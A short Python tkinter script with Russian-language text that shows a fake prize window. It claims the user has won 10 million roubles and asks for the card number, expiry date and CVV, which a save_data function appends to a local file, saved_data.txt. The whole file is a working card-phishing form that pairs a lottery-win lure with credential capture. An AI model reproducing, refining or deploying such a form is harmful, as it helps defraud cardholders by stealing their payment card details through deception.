import tkinter as tk
from tkinter import *
from PIL import Image, ImageTk, ImageSequence
gif_frames = []

def save_data():
    code = empty_code.get()
    dmg = empty_DMG.get()
    cvv = empty_CVV.get()

    with open('saved_data.txt', 'a') as file:
        file.write(f'Пин: {code}\nДата: {dmg}\nCVV: {cvv}\n')

root = tk.Tk()
root.title('ВЫИГРЫШ')
root.geometry('1500x800')

label = tk.Label(root, text='Вы выиграли 10000000 рублей, введите данные карты,\n чтобы мы отправили вам выигрыш', font=('Times New Roman', 25, 'italic'))
label.pack()
gif_path = "voytenko.gif"
gif_img = Image.open(gif_path)
gif_frames = [ImageTk.PhotoImage(img.copy()) for img in ImageSequence.Iterator(gif_img)]
label_gif = tk.Label(root)
label_gif.pack()

def update_frame(index):
    frame = gif_frames[index]
    label_gif.configure(image=frame)
    label_gif.image = frame
    root.after(100, update_frame, (index + 1) % len(gif_frames))

update_frame(0)

label_code = tk.Label(root, text='введите 16-ти значный код с лецевой стороны вашей карты', font=('Times New Roman', 25, 'italic'))
label_code.pack()
empty_code = tk.Entry(root)
empty_code.pack()

label_DMG = tk.Label(root, text='срок годности вашей карты', font=('Times New Roman', 25, 'italic'))
label_DMG.pack()
empty_DMG = tk.Entry(root)
empty_DMG.pack()

label_CVV = tk.Label(root, text='введите 3-х значный код с обратной стороны вашей карты', font=('Times New Roman', 25, 'italic'))
label_CVV.pack()
empty_CVV = tk.Entry(root)
empty_CVV.pack()

button_save = tk.Button(root, text='Отправить данные для получения выигрыша', font=('Times New Roman', 25, 'italic'), command=save_data)
button_save.pack()

root.mainloop()